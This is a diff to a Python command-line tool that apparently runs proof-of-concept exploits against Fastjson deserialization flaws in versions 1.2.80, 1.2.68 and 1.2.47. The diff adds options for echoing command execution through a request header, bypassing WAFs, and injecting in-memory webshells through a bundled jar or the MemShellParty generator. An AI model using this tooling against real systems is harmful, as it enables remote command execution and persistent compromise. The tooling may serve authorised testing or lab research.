@@ -397,6 +397,21 @@ def poc_1280_cmd(
         "--currency-field",
         help="Currency MiscCodec 字段：currency 或 currencyCode",
     ),
+    echo: bool = typer.Option(False, "--echo", "-e", help="命令回显"),
+    engine: str = typer.Option("auto", "--engine", help="回显引擎"),
+    cmd: str = typer.Option("id", "--cmd", help="回显默认命令"),
+    cmd_header: str = typer.Option("X-Cmd", "--cmd-header", help="命令请求头"),
+    memshell: bool = typer.Option(
+        False, "--memshell", help="注入内存马（与 --echo 互斥；默认内置 jar）"
+    ),
+    ms_api: str = typer.Option(
+        "jar", "--ms-api", help="jar 或 http(s)://... MemShellParty"
+    ),
+    ms_server: str = typer.Option("Undertow", "--ms-server"),
+    ms_tool: str = typer.Option("Command", "--ms-tool"),
+    ms_type: str = typer.Option("Filter", "--ms-type"),
+    ms_path: str = typer.Option("/*", "--ms-path"),
+    ms_jdk: str = typer.Option("8", "--ms-jdk"),
     target: str = typer.Option(
         "http://127.0.0.1:18280/api/fastjson",
         "--url",
@@ -446,6 +461,17 @@ def poc_1280_cmd(
         classpath=classpath,
         wrap_currency=wrap_currency,
         currency_field=currency_field,
+        echo=echo,
+        engine=engine,  # type: ignore[arg-type]
+        cmd=cmd,
+        cmd_header=cmd_header,
+        memshell=memshell,
+        ms_api=ms_api,
+        ms_server=ms_server,
+        ms_tool=ms_tool,
+        ms_type=ms_type,
+        ms_path=ms_path,
+        ms_jdk=ms_jdk,
         waf_techniques=waf_techs,
         waf_options=waf_opts,
         target=target,
@@ -462,6 +488,8 @@ def poc_1280_cmd(
         typer.echo(result.model_dump_json(indent=2))
     else:
         rprint(Panel(result.summary, title=f"1.2.80 / {result.gadget}", border_style="cyan"))
+        if result.memshell_connect:
+            rprint(Panel(result.memshell_connect, title="memshell 连接信息", border_style="green"))
         if result.steps:
             for i, step in enumerate(result.steps, 1):
                 rprint(f"[dim]--- step {i}/{len(result.steps)} ---[/dim]")
@@ -502,6 +530,21 @@ def poc_1268_cmd(
         "--currency-field",
         help="Currency MiscCodec 字段：currency 或 currencyCode",
     ),
+    echo: bool = typer.Option(False, "--echo", "-e", help="postgresql_ssrf 命令回显"),
+    engine: str = typer.Option("auto", "--engine", help="回显引擎"),
+    cmd: str = typer.Option("id", "--cmd", help="回显默认命令"),
+    cmd_header: str = typer.Option("X-Cmd", "--cmd-header", help="命令请求头"),
+    memshell: bool = typer.Option(
+        False, "--memshell", help="注入内存马（与 --echo 互斥；默认内置 jar）"
+    ),
+    ms_api: str = typer.Option(
+        "jar", "--ms-api", help="jar 或 http(s)://... MemShellParty"
+    ),
+    ms_server: str = typer.Option("Undertow", "--ms-server"),
+    ms_tool: str = typer.Option("Command", "--ms-tool"),
+    ms_type: str = typer.Option("Filter", "--ms-type"),
+    ms_path: str = typer.Option("/*", "--ms-path"),
+    ms_jdk: str = typer.Option("8", "--ms-jdk"),
     target: str = typer.Option(
         "http://127.0.0.1:18268/api/fastjson",
         "--url",
@@ -553,6 +596,17 @@ def poc_1268_cmd(
         socket_factory_arg=socket_factory_arg,
         wrap_currency=wrap_currency,
         currency_field=currency_field,
+        echo=echo,
+        engine=engine,  # type: ignore[arg-type]
+        cmd=cmd,
+        cmd_header=cmd_header,
+        memshell=memshell,
+        ms_api=ms_api,
+        ms_server=ms_server,
+        ms_tool=ms_tool,
+        ms_type=ms_type,
+        ms_path=ms_path,
+        ms_jdk=ms_jdk,
         waf_techniques=waf_techs,
         waf_options=waf_opts,
         target=target,
@@ -568,6 +622,8 @@ def poc_1268_cmd(
         typer.echo(result.model_dump_json(indent=2))
     else:
         rprint(Panel(result.summary, title=f"1.2.68 / {result.gadget}", border_style="cyan"))
+        if result.memshell_connect:
+            rprint(Panel(result.memshell_connect, title="memshell 连接信息", border_style="green"))
         rprint(result.payload[:2000] + ("..." if len(result.payload) > 2000 else ""))
         if result.sent and result.status_code is not None:
             rprint(f"[dim]HTTP {result.status_code}[/dim]")
@@ -623,6 +679,21 @@ def poc_1247_cmd(
         "--json-key-array",
         help="json_key 用 JSONArray 作 key：[{...}]:{}",
     ),
+    echo: bool = typer.Option(False, "--echo", "-e", help="BCEL/H2/MyBatis 命令回显"),
+    engine: str = typer.Option("auto", "--engine", help="回显引擎"),
+    cmd: str = typer.Option("id", "--cmd", help="回显默认命令"),
+    cmd_header: str = typer.Option("X-Cmd", "--cmd-header", help="命令请求头"),
+    memshell: bool = typer.Option(
+        False, "--memshell", help="注入内存马（与 --echo 互斥；默认内置 jar）"
+    ),
+    ms_api: str = typer.Option(
+        "jar", "--ms-api", help="jar 或 http(s)://... MemShellParty"
+    ),
+    ms_server: str = typer.Option("Undertow", "--ms-server"),
+    ms_tool: str = typer.Option("Command", "--ms-tool"),
+    ms_type: str = typer.Option("Filter", "--ms-type"),
+    ms_path: str = typer.Option("/*", "--ms-path"),
+    ms_jdk: str = typer.Option("8", "--ms-jdk"),
     target: str = typer.Option(
         "http://127.0.0.1:18247/api/fastjson",
         "--url",
@@ -669,6 +740,17 @@ def poc_1247_cmd(
         currency_field=currency_field,
         json_key_with_type=not json_key_no_type,
         json_key_as_array=json_key_as_array,
+        echo=echo,
+        engine=engine,  # type: ignore[arg-type]
+        cmd=cmd,
+        cmd_header=cmd_header,
+        memshell=memshell,
+        ms_api=ms_api,
+        ms_server=ms_server,
+        ms_tool=ms_tool,
+        ms_type=ms_type,
+        ms_path=ms_path,
+        ms_jdk=ms_jdk,
         waf_techniques=waf_techs,
         waf_options=waf_opts,
         target=target,
@@ -684,6 +766,8 @@ def poc_1247_cmd(
         typer.echo(result.model_dump_json(indent=2))
     else:
         rprint(Panel(result.summary, title=f"1.2.47 / {result.gadget}", border_style="cyan"))
+        if result.memshell_connect:
+            rprint(Panel(result.memshell_connect, title="memshell 连接信息", border_style="green"))
         rprint(result.payload)
         if result.sent and result.status_code is not None:
             rprint(f"[dim]HTTP {result.status_code}[/dim]")
@@ -723,8 +807,12 @@ def poc_16723_cmd(
         help="读证明文件的 docker 容器名；传空禁用",
     ),
     reuse_type: Optional[str] = typer.Option(None, "--type", "-t", help="复用已命中 @type"),
-    memshell: bool = typer.Option(False, "--memshell", help="注入内存马（需 MemShellParty）"),
-    ms_api: str = typer.Option("http://127.0.0.1:8091", "--ms-api"),
+    memshell: bool = typer.Option(
+        False, "--memshell", help="注入内存马（默认内置 jar；也可 --ms-api http://...）"
+    ),
+    ms_api: str = typer.Option(
+        "jar", "--ms-api", help="jar=内置 memshell-gen.jar；或 http(s)://..."
+    ),
     ms_server: str = typer.Option("Undertow", "--ms-server"),
     ms_tool: str = typer.Option("Command", "--ms-tool"),
     ms_type: str = typer.Option("Filter", "--ms-type"),
